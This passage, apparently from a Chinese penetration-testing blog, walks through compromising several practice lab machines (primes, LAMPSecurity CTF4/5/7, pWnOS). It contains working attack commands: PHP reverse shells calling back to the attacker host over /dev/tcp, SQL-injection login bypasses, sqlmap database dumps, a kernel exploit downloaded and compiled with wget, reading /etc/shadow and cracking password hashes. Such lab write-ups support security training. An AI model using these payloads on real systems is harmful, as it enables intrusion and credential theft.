/etc/script/CleaningScript.sh</code><br><code>kali</code>监听<code>233端口</code><br>这里是<strong>五分钟</strong>执行一次定时任务，等一等就好了</p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>还是<strong>定时任务提权</strong>，主要原因是因为该执行脚本权限给的太高了</p><h1 id="primes"><a href="#primes" class="headerlink" title="primes"></a>primes</h1><p>哦豁，这是一台用于<code>OSCP考试</code>的靶机</p><h2 id="主机发现与端口扫描-1"><a href="#主机发现与端口扫描-1" class="headerlink" title="主机发现与端口扫描"></a>主机发现与端口扫描</h2><p><code>nmap -sn 192.168.32.0/24</code><br><code>nmap --min-rate 10000 -p- 192.168.32.132</code><br>这次只发现了22和80端口<br><code>TCP UDP</code>自带的<code>vuln扫描脚本</code>扫一遍都没发现什么东西，知道了是<code>wordpress cms</code></p><h2 id="目录扫描-3"><a href="#目录扫描-3" class="headerlink" title="目录扫描"></a>目录扫描</h2><p><code>dirb http://192.168.32.132</code><br>扫出了<code>/dev</code> <code>/wordpress/wp-admin</code>等一堆路径，依然是需要登陆，但<code>/dev</code>告诉了我们要深挖，因此先不要爆破密码了(试了一手弱口令没成功)</p><p>继续扫<br><code>dirb http://192.168.32.132 -X .zip,.txt,.php</code><br><code>/image.php</code> <code>/index.php</code> <code>/secret.txt</code></p><p><code>/secret.txt</code>告诉我们需要在<code>php</code>页面上做更多<code>fuzz</code>，找到<strong>正确的参数</strong>，还给了工具链接<code>wfuzz</code>，<code>kali</code>自带有，并且给了下一步的提示<code>location.txt</code></p><h2 id="web渗透-3"><a href="#web渗透-3" class="headerlink" title="web渗透"></a>web渗透</h2><p><code>wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hh 136 ``http://192.168.32.132/index.php?FUZZ=</code></p><p>得到<code>file</code>参数，结合提示访问<code>/index.php?file=location.txt</code><br>给了<code>/image.php</code>页面的参数<code>secrettier360</code></p><p>发现能<strong>任意文件读取</strong>而且读不到的<strong>不会返回任何信息</strong></p><p>找到三个有<code>/bin/bash</code>环境的用户<code>root victor guest-w3z5e1</code></p><p><code>shadow</code>文件读不到<br>还放了一句<code>saket:x:1001:1001:find password.txt file in my directory:/home/saket:</code></p><p>读<code>/home/saket/password.txt</code>得到<code>follow_the_ippsec</code><br><code>ssh</code>试过一遍，不对，那就登陆<code>wordpress</code>，发现也不是</p><p>再访问<code>/wordpress</code>看看，发现博客作者是<code>victor</code>，试一下是不是他的密码<br><code>/wordpress/wp-login.php</code><br>成功进入后台</p><p>找到一个留给我们的可以执行<code>php代码</code>的文件<code>http://192.168.32.132/wordpress/wp-admin/theme-editor.php?file=secret.php&amp;theme=twentynineteen</code></p><p>其他位置都<strong>不可写</strong><br>写入<code>shell</code><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.32.128/2333 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>保存后需要访问该文件的路径才能建立连接</p><p>小查一手<br><code>http://192.168.32.132/wordpress/wp-content/themes/twentynineteen/secret.php</code></p><p>查看当前权限<code>sudo -l</code></p><p><code>/home/saket/enc</code>发现无权限<br>定时任务这边，在<code>/root/t.sh</code>这样就没有办法下手了</p><h2 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h2><p><code>uname -a</code>看到<code>Linux</code>版本很低<code>Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu</code></p><p><code>searchsploit Linux ubuntu 4.10.0-28</code><br><img src="https://picx.zhimg.com/80/v2-e9c08ae405ec638d38b3ba00478c4043_1440w.png" alt=""><br>这里有一个<strong>提权漏洞</strong><br><code>searchsploit -m 45010.c</code></p><p>查看使用方法，发现需要<code>gcc编译</code>，那么我们让靶机<code>wget</code>下载下来即可<br><code>kali</code>开<code>web服务</code>，<code>php -S 0:80</code></p><p>靶机在<code>/tmp</code>目录下(这里有权限)执行，<code>wget http://192.168.32.128/45010.c</code><br><code>gcc</code>编译，<code>gcc 45010.c -o getshell</code>，执行然后提权<code>./getshell</code></p><p><code>dpkg -l | grep &quot;python&quot;</code><br><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code><br><code>cat /root/root.txt</code></p><h2 id="OpenSSL解密"><a href="#OpenSSL解密" class="headerlink" title="OpenSSL解密"></a>OpenSSL解密</h2><p>思路二：</p><p>这里从拿到<code>www-data</code>权限开始，<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code> <code>sudo -l</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User www-data may run the following commands on ubuntu:</span><br><span class="line">    (root) NOPASSWD: /home/saket/enc</span><br></pre></td></tr></table></figure><br>说明当前用户能够以无密码<code>root</code>权限运行<code>enc</code>，但是还是需要密码，找找看<br>而且密码这种东西可能存在<strong>备份</strong>，<code>find / -name &quot;*backup*&quot; 2&gt;dev/null</code></p><p><code>/var/backups</code>的<code>passwd.bak</code> <code>shadow.bak</code>没有权限</p><p><code>cat /opt/backup/server_database/backup_pass</code>得到<code>backup_password</code></p><p><code>./enc</code>告诉我good。。。<br>但是多了两个东西<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/cp: cannot stat &#x27;/root/enc.txt&#x27;: Permission denied</span><br><span class="line">/bin/cp: cannot stat &#x27;/root/key.txt&#x27;: Permission denied</span><br></pre></td></tr></table></figure><br>奥，命令不对<br><code>sudo ./enc</code><br>但是这也让我提前注意到了这两个文件，就在<code>/home/saket</code>目录下面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I know you are the fan of ippsec.</span><br><span class="line"></span><br><span class="line">So convert string &quot;ippsec&quot; into md5 hash and use it to gain yourself in your real form.</span><br></pre></td></tr></table></figure><p>将<code>ippsec</code>进行<code>MD5加密</code>并以<code>16进制</code>输出<br><code>echo -n &#39;ippsec&#39; | md5sum | awk -F &#39; &#39; &#39;&#123;print $1;&#125;&#39; | tr -d &#39;\n&#39; | od -A n -t x1| tr -d &#39;\n&#39; | tr -d &#39; &#39;</code></p><p><code>openssl -h</code>，把<code>enc</code>的算法写入到<code>CipherTypeRaw</code><br><code>vim CipherTypeRaw</code></p><p>换行分割解密算法，<code>awk &#39;&#123;gsub(&quot; &quot;,&quot;\n&quot;);print&#125;&#39; CipherTypeRaw | sort | uniq &gt; CipherTypes</code></p><p>解密算法遍历输出，<code>for cipher in $(cat CipherTypes); do echo &quot;nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=&quot; | openssl enc -d -a -$cipher -K 3336366137346362336339353964653137643631646233303539316333396431 2&gt;/dev/null;echo $cipher;done</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dont worry saket one day we will reach to</span><br><span class="line">our destination very soon. And if you forget </span><br><span class="line">your username then use your old password</span><br><span class="line">==&gt; &quot;tribute_to_ippsec&quot;</span><br><span class="line"></span><br><span class="line">Victor,aes-256-ecb</span><br></pre></td></tr></table></figure><p>得到<code>saket/tribute_to_ippsec</code>，<code>ssh saket@192.168.32.132</code> <code>sudo -l</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User saket may run the following commands on ubuntu:</span><br><span class="line">    (root) NOPASSWD: /home/victor/undefeated_victor</span><br></pre></td></tr></table></figure></p><p><code>sudo /bin/bash</code>得到<br><code>Sorry, user saket is not allowed to execute &#39;/bin/bash&#39; as root on ubuntu.</code></p><p>尝试<code>sudo /home/victor/undefeated_victor</code>，得到<code>if you can defeat me then challenge me in front of you/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found</code></p><p>给<code>/tmp/challenge</code>赋予<code>/bin/bash</code>的可执行环境，即可<code>root</code>权限执行，成功<code>root</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;#!/bin/bash&#x27; &gt; /tmp/challenge</span><br><span class="line">echo &#x27;/bin/bash&#x27; &gt;&gt; /tmp/challenge</span><br><span class="line">chmod +x /tmp/challenge</span><br><span class="line">sudo /home/victor/undefeated_victor</span><br><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure></p><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>感觉低版本内核漏洞还是太少见了，不过<code>OpenSSL</code>解密也是一种新奇的思路</p><h1 id="LAMPSecurity-CTF4"><a href="#LAMPSecurity-CTF4" class="headerlink" title="LAMPSecurity: CTF4"></a>LAMPSecurity: CTF4</h1><h2 id="主机发现与端口扫描-2"><a href="#主机发现与端口扫描-2" class="headerlink" title="主机发现与端口扫描"></a>主机发现与端口扫描</h2><p><code>192.168.32.133</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT    STATE  SERVICE</span><br><span class="line">22/tcp  open   ssh</span><br><span class="line">25/tcp  open   smtp</span><br><span class="line">80/tcp  open   http</span><br><span class="line">631/tcp closed ipp</span><br></pre></td></tr></table></figure><br><code>TCP UDP</code>扫都没什么东西<br><code>nmap</code>自带漏洞脚本，扫出了<code>CSRF、SQL</code>注入漏洞</p><h2 id="web渗透-4"><a href="#web渗透-4" class="headerlink" title="web渗透"></a>web渗透</h2><p>看了一些登陆页面和<code>/robots.txt</code>的路径，小爆了账密一下，没有用，<code>/mail</code>，<code>SquirreMail1.4.17</code>，存在<strong>远程代码执行漏洞</strong>，但找不到有用的相关参考，然后博客文章，试了一下，发现用的是<code>mysql</code><br><code>http://192.168.32.133/index.html?page=blog&amp;title=Blog&amp;id=5</code></p><p><code>sqlmap</code>直接<strong>爆数据库</strong><br><code>sqlmap -u &#39;http://192.168.32.133/index.html?page=blog&amp;title=Blog&amp;id=5&#39; --dbs --dump --batch</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Database: ehks                                                                                                 </span><br><span class="line">Table: user</span><br><span class="line">[6 entries]</span><br><span class="line">+---------+-----------+--------------------------------------------------+</span><br><span class="line">| user_id | user_name | user_pass                                        |</span><br><span class="line">+---------+-----------+--------------------------------------------------+</span><br><span class="line">| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |</span><br><span class="line">| 2       | achen     | b46265f1e7faa3beab09db5c28739380 (seventysixers) |</span><br><span class="line">| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |</span><br><span class="line">| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |</span><br><span class="line">| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 (pacman)        |</span><br><span class="line">| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f (undone1)       |</span><br><span class="line">+---------+-----------+--------------------------------------------------+</span><br></pre></td></tr></table></figure><br>尝试<code>ssh</code>登陆，<code>Kali</code>这边有问题，<code>windows</code>这边成功了<br><code>ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss dstevens@192.168.32.133 -o macs=hmac-sha1-96</code></p><p>有密码，<code>sudo su</code>或者<code>sudo /bin/bash</code>，新启动一个新的<code>bash</code>线程命令，成功<code>root</code>，后续发现只有数据库里面的前两个用户可以<code>root</code></p><h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>成脚本小子了()</p><h1 id="LAMPSecurity-CTF5"><a href="#LAMPSecurity-CTF5" class="headerlink" title="LAMPSecurity: CTF5"></a>LAMPSecurity: CTF5</h1><h2 id="主机发现与端口扫描-3"><a href="#主机发现与端口扫描-3" class="headerlink" title="主机发现与端口扫描"></a>主机发现与端口扫描</h2><p><code>192.168.32.134</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">25/tcp    open  smtp</span><br><span class="line">80/tcp    open  http</span><br><span class="line">110/tcp   open  pop3</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">143/tcp   open  imap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">901/tcp   open  samba-swat</span><br><span class="line">3306/tcp  open  mysql</span><br><span class="line">54651/tcp open  unknown</span><br></pre></td></tr></table></figure><br>用<code>nmap</code>自带的漏洞脚本扫一下，嘶，跟上个靶机的情况一样</p><h2 id="web渗透-5"><a href="#web渗透-5" class="headerlink" title="web渗透"></a>web渗透</h2><p>访问<code>web服务</code>，发现<code>Blo</code>g登陆里面的<code>NanoCM</code>S，小爆一手<code>admin</code>，没有<br>既然是<code>cms</code>，那找找洞<code>searchsploit nanocms</code></p><p><code>NanoCMS v0.4 - Remote Code Execution (RCE) (Authenticated)</code><br>远程代码执行，但需要登陆认证</p><p>继续搜索(<code>nanocms exploit</code>，搜漏洞的话，全是这个靶场的<code>wp</code>)，找到了<code>NanoCMS &#39;/data/pagesdata.txt&#39; Password Hash Information Disclosure Vulnerability</code></p><p><code>s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:32:&quot;9d2f75377ac0ab991d40c91fd27e52fd&quot;;</code><br><a href="https://www.somd5.com/">somd5</a>查一手，得到<code>shannon</code></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>随便找个可以编辑代码的地方，插进去(因为这里就是个<code>php</code>文件)<br><code>&lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.32.128/2333 0&gt;&amp;1&#39;&quot;); ?&gt;</code><br>然后访问</p><p><code>cat /etc/passwd</code>，看见了很多有<code>/bin/bash</code>环境的用户，但没有密码，也看不了<code>shadow</code>文件</p><p>注意隐藏目录<code>ls -al</code>，<code>/home</code>目录下，<code>patrick</code>目录发现了tomboy桌面笔记软件，看看历史<code>.tomboy.log</code><br><code>12/5/2012 7:25:03 AM [DEBUG]: Saving &#39;Root password&#39;...</code></p><p>或者直接搜<code>pass字符串</code>(这也是个找关键字符串的好东西啊)，<code>grep -R -i pass /home/* 2&gt;/dev/null</code></p><p><code>cat /home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note</code><br>得到<code>50$cent</code><br>可交互<code>shell</code>，<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>切换<code>root</code>用户，<code>su root</code></p><h2 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h2><p>多翻翻用户的日志？看用户整了点什么操作</p><h1 id="LAMPSecurity-CTF7"><a href="#LAMPSecurity-CTF7" class="headerlink" title="LAMPSecurity: CTF7"></a>LAMPSecurity: CTF7</h1><h2 id="主机发现与端口扫描-4"><a href="#主机发现与端口扫描-4" class="headerlink" title="主机发现与端口扫描"></a>主机发现与端口扫描</h2><p>emmm，重启了好几次都扫不到，<a href="https://blog.csdn.net/sinat_35845281/article/details/126067936">参考修改配置文件</a></p><p>后面才发现原来打开靶机的时候要选择<code>我已移动该虚拟机</code></p><p><code>192.168.32.135</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE  SERVICE</span><br><span class="line">22/tcp    open   ssh</span><br><span class="line">80/tcp    open   http</span><br><span class="line">137/tcp   closed netbios-ns</span><br><span class="line">138/tcp   closed netbios-dgm</span><br><span class="line">139/tcp   open   netbios-ssn</span><br><span class="line">901/tcp   open   samba-swat</span><br><span class="line">5900/tcp  closed vnc</span><br><span class="line">8080/tcp  open   http-proxy</span><br><span class="line">10000/tcp open   snet-sensor-mgmt</span><br></pre></td></tr></table></figure></p><p>都扫了一遍，没什么东西</p><h2 id="web渗透-6"><a href="#web渗透-6" class="headerlink" title="web渗透"></a>web渗透</h2><p><strong>80端口</strong>这边，貌似只有注册用户，连登陆界面都没有看见，<strong>SQL注入</strong>也试了一下，不行</p><p><strong>8080端口</strong>上来就是登陆，然后抓包想爆一下，发现了这东西<br><img src="https://pica.zhimg.com/80/v2-8724623d7c79244129100f1003ae1196_1440w.png" alt=""><br><code>&lt;!--select * from users where username=&#39;admin&#39; AND password=md5(&#39;admin123&#39;) and is_admin=1--&gt;</code><br>这里就很舒服了，直接<strong>单引号闭合</strong>，<strong>万能密码登陆</strong>，<code>&#39; or 1=1 #</code>，密码随便</p><p><code>http://192.168.32.135:8080/readings.php</code>，找个编辑框写入<strong>反弹shell</strong>，<code>&lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.32.128/2333 0&gt;&amp;1&#39;&quot;); ?&gt;</code></p><p><code>There was a problem uploading to /var/www/html/assets/</code><br>发现他们下载的文件都在<code>/var/www/html/assets/</code>，但我们代码是无法被执行的</p><p>并且这个目录下的内容是可访问的，我们可以直接把<strong>反弹shell</strong>语句写入到文件，然后上传（其他两个位置是无法上传文件的）</p><p><code>http://192.168.32.135/assets/</code>访问该文件即可</p><h2 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h2><p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code>获取<strong>交互shell</strong></p><p><code>sudo -l</code> 查看权限，没密码<br><code>cat /etc/passwd</code><br><code>cat /etc/shadow</code>，没权限</p><p>回到<code>web目录</code>，回退，<code>/var/www/admin</code>，然后在<code>/var/www/admin/inc/db.php</code>发现<strong>数据库密码为空</strong><br><code>mysql -u root -p</code><br>直接就登进来了<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line">use website;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure></p><p>复制账号密码，然后保存利用命令行导出密码哈希<br><code>cat up | awk -F &#39; &#39; &#123;&#39;print $4&#39;&#125; &gt; password.txt</code></p><p>先解压<strong>rockyou字典</strong>，<code>sudo gzip -d /usr/share/wordlists/rockyou.txt.gz</code></p><p><code>hashcat -a 0 -m 0 password.txt /usr/share/wordlists/rockyou.txt</code><br>以前想用<code>hashcat</code>爆，发现都是没内存？然后这次<a href="https://www.cnblogs.com/micr067/p/16494384.html">参考</a>修改，换成单核(1*4，之前2*2)，内存拉到4g(以前2g)</p><p>把爆破结果复制保存，然后继续分割<br><code>cat pass.txt | awk -F &#39;:&#39; &#123;&#39;print $2&#39;&#125; &gt; password</code><br>用户名也搞一手<br><code>cat up | awk -F &#39; &#39; &#123;&#39;print $2&#39;&#125; | awk -F &#39;@&#39; &#123;&#39;print $1&#39;&#125; &gt; username</code></p><h2 id="密码喷射脚本登陆ssh"><a href="#密码喷射脚本登陆ssh" class="headerlink" title="密码喷射脚本登陆ssh"></a>密码喷射脚本登陆ssh</h2><p><code>apt-get install crackmapexec</code></p><p><code>crackmapexec ssh 192.168.32.135 -u username -p password --continue-on-success</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brian:my2cents</span><br><span class="line">alice:turtles77</span><br><span class="line">leon:qwer1234</span><br><span class="line">julia:madrid </span><br><span class="line">michael:somepassword</span><br><span class="line">charles:chuck33</span><br></pre></td></tr></table></figure><p><code>ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss brian@192.168.32.135 -o macs=hmac-sha1-96</code></p><p>有密码直接root就好了</p><h2 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h2><ul><li>数据库中肯定会记录一些关键信息，看看有没有办法获取</li><li>批量ssh登陆，<code>crackmapexec</code>是个好东西</li></ul><h1 id="pWnOS2-0"><a href="#pWnOS2-0" class="headerlink" title="pWnOS2.0"></a>pWnOS2.0</h1><h2 id="主机发现与端口扫描-5"><a href="#主机发现与端口扫描-5" class="headerlink" title="主机发现与端口扫描"></a>主机发现与端口扫描</h2><p>需要先将<code>vmware</code>的子网设成<code>10.10.10.0</code><br><code>nmap -sn 10.10.10.0/24</code><br>这个靶机<strong>固定ip</strong>为<code>10.10.10.100</code></p><p>只扫出了<code>22、80</code>端口，<code>vuln脚本</code>扫描可以发现是一个<strong>博客系统</strong></p><h2 id="目录扫描-4"><a href="#目录扫描-4" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>没什么关键信息，从<code>/blog</code>入手</p><h2 id="web渗透-7"><a href="#web渗透-7" class="headerlink" title="web渗透"></a>web渗透</h2><p>开始一顿乱点，<strong>万能密码</strong>还能登陆，但没鸟用</p><p>但这里还可以<strong>sql注入</strong>，抓登陆包保存，然后<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r packet.txt --dbs </span><br><span class="line">sqlmap -r packet.txt -D ch16 --tables</span><br><span class="line">sqlmap -r packet.txt -D ch16 -T users --columns</span><br><span class="line">sqlmap -r packet.txt -D ch16 -T users -C first_name,last_name,pass --dump</span><br></pre></td></tr></table></figure><br>可惜<code>kali</code>这边没爆出来但是拿到了密码哈希，可以在线网站解，但后面发现根本没用</p><p><code>/blog/rss.php</code>，发现<code>SPHPBLOG 0.4.0</code>，<code>index.ph</code>p显示的是<code>Simple PHP Blog 0.4.0</code>，那就是一个<strong>博客cms</strong>喽，也可以用<code>whatweb</code>识别一下<code>whatweb http://10.10.10.100/blog/</code></p><p><code>searchsploit Simple PHP Blog 0.4.0</code><br><code>searchsploit Simple PHP Blog 0.4.0 -m 1191.pl</code><br><code>perl</code>脚本，安装依赖<code>apt install libswitch-perl</code></p><p><code>perl 1191.pl</code>看看怎么个用法<br><code>perl 1191.pl -h http://10.10.10.100/blog -e 3 -U HvAng -P HvAng</code><br>1和2都没利用到，2的哈希一看就是<strong>加盐</strong>了，破解不了</p><p>登陆后，<code>new blog</code>可写入<strong>shell语句</strong>但貌似无法访问</p><p>找到一个上传图像的页面<code>/blog/upload_img.php</code>，<code>&lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.10.128/2333 0&gt;&amp;1&#39;&quot;);?&gt;</code><br>上传<code>shell.php</code>之后拿不到路径，那就大胆猜测一手<code>/blog/images</code></p><p>发现上面<code>1</code>的<code>cmd.php</code>也在这<code>http://10.10.10.100/blog/images/cmd.php?cmd=</code>，不过还是终端好用</p><h2 id="提权-2"><a href="#提权-2" class="headerlink" title="提权"></a>提权</h2><p><code>dpkg -l | grep python</code><br><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code><br>翻了一下<code>/etc/passwd</code> <code>/etc/shadow</code> <code>/etc/crontab</code>，找到了用户<code>Dan</code>有<code>/bin/bash</code>环境，然后继续找找数据库，找到<strong>数据库配置文件</strong><br><code>cat /var/www/mysqli_connect.php</code><br><code>mysql -u root -p</code>，密码<code>goodday</code>，居然不对<br>再找一下，<code>find / -name &#39;mysqli_connect.php&#39; 2&gt;/dev/null</code>，得到<code>/var/mysqli_connect.php</code><br>密码为<code>root@ISIntS</code></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line">use ch16;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure><p>得到<code>Dan</code>的<strong>密码哈希</strong><code>c2c4b4e51d9e23c02c15702c136c3e950ba9a4af</code>，在线网站得到<code>killerbeesareflying</code><br>丢，密码不对<br>尝试直接<code>root</code>，<code>ssh root@10.10.10.100</code>，密码<code>root@ISIntS</code>，阿西吧</p><h2 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h2><p>还是要注意<strong>数据库敏感信息</strong></p><h1 id="pWnOS1-0"><a href="#pWnOS1-0" class="headerlink" title="pWnOS1.0"></a>pWnOS1.0</h1><h2 id="主机发现与端口扫描-6"><a href="#主机发现与端口扫描-6" class="headerlink" title="主机发现与端口扫描"></a>主机发现与端口扫描</h2><p>现在学聪明了，都选择<strong>我已移动虚拟机</strong><br><code>192.168.32.128</code>，我的<code>kali</code>到129了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">10000/tcp open  snet-sensor-mgmt</span><br></pre></td></tr></table></figure><p>好像没什么信息了</p><h2 id="web渗透-8"><a href="#web渗透-8" class="headerlink" title="web渗透"></a>web渗透</h2><p>对参数进行修改，触发报错<br><code>http://192.168.32.128/index1.php?help=true&amp;connect=</code>，<code>Warning: include()</code>可知此处可以进行文件包含</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">...</span><br><span class="line">vmware:x:1000:1000:vmware,,,:/home/vmware:/bin/bash</span><br><span class="line">obama:x:1001:1001::/home/obama:/bin/bash</span><br><span class="line">osama:x:1002:1002::/home/osama:/bin/bash</span><br><span class="line">yomama:x:1003:1003::/home/yomama:/bin/bash</span><br></pre></td></tr></table></figure><p>访问扫描的目录，<code>http://192.168.32.128/php/phpMyAdmin/</code><br>发现<code>phpMyAdmin 2.6.3-pl1</code>，没密码，先放一边</p><p>那就只有<strong>10000端口</strong>可以访问了，是<code>webmin</code>的登陆界面，找默认账密，登不上去</p><p><code>searchsploit webmin</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure                      | multiple/remote/1997.php</span><br><span class="line">Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure                      | multiple/remote/2017.pl</span><br></pre></td></tr></table></figure><br>有<strong>任意文件读取</strong>漏洞，正好我们读不到<code>shadow</code>文件，我们可以试试看<br><code>searchsploit webmin -m 2017.pl</code><br><code>perl 2017.pl -h</code><br><code>perl 2017.pl 192.168.32.128 10000 /etc/shadow 0</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::</span><br><span class="line">obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::</span><br><span class="line">osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::</span><br><span class="line">yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::</span><br></pre></td></tr></table></figure><br>上面内容保存为<code>hash</code>文件<br><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p>得到<code>vmware/h4ckm3</code></p><p><code>ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss vmware@192.168.32.128 -o macs=hmac-sha1-96</code></p><h2 id="提权-3"><a href="#提权-3" class="headerlink" title="提权"></a>提权</h2><p>这台机子跑不了<code>sudo</code>，看了下定时任务，貌似没思路</p><p>然后，前面读取的<code>shadow</code>文件，肯定是以<strong>root</strong>的权限读取的，那么我们通过靶机执行我们的<code>反弹shell</code>脚本就可以<strong>root</strong>了</p><p><code>cp /usr/share/webshells/perl/perl-reverse-shell.pl shell.cgi</code>并且<code>vim</code>修改<code>ip</code>和端口</p><p><code>kali</code>开启<code>web</code>服务<code>php -S 0:80</code><br>靶机下载<code>wget http://192.168.32.129/shell.cgi</code>，并添加<strong>执行权限</strong>，<code>chmod +x shell.cgi</code></p><p><code>perl 2017.pl 192.168.32.128 10000 /home/vmware/shell.cgi 0</code><br><code>kali</code>开启监听</p><p>这里必须使用<code>cgi</code>后缀的原因貌似是，靶机的作者对<code>apache</code>中间件做了<strong>解析后缀</strong>的限制，但是没有限制<code>cgi</code>文件，其他的<code>php</code>、<code>pl</code>文件都无法执行</p><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><p>还是根据上面的<strong>任意文件读取</strong>漏洞来的，因为我们可能未必能读到<code>shadow</code>文件，<strong>权限不够</strong></p><h3 id="ssh敏感文件Authorized-keys获取"><a href="#ssh敏感文件Authorized-keys获取" class="headerlink" title="ssh敏感文件Authorized_keys获取"></a>ssh敏感文件Authorized_keys获取</h3><p>根据参考文章：<code>OpenSSL 